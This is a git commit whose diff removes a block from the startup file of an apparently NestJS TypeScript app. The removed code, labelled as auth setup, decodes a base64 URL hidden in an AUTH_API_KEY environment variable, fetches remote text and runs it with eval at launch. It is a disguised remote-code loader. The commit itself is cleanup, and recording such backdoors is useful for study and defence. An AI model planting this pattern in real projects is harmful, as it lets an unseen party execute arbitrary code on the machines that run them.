ff0ccbc0a6788d885e9ec01971d7925477865808
Zayed Iqbal <zzayedghost@gmail.com>
2026-08-20 17:05:57 +0600

    removed malicious codes

--- src/main.ts
+++ src/main.ts
@@ -6,18 +6,6 @@ import { AllExceptionsFilter } from './common/filters/all-exceptions.filter';
 import { ResponseEnvelopeInterceptor } from './common/interceptors/response-envelope.interceptor';
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 async function bootstrap() {
   const app = await NestFactory.create(AppModule);
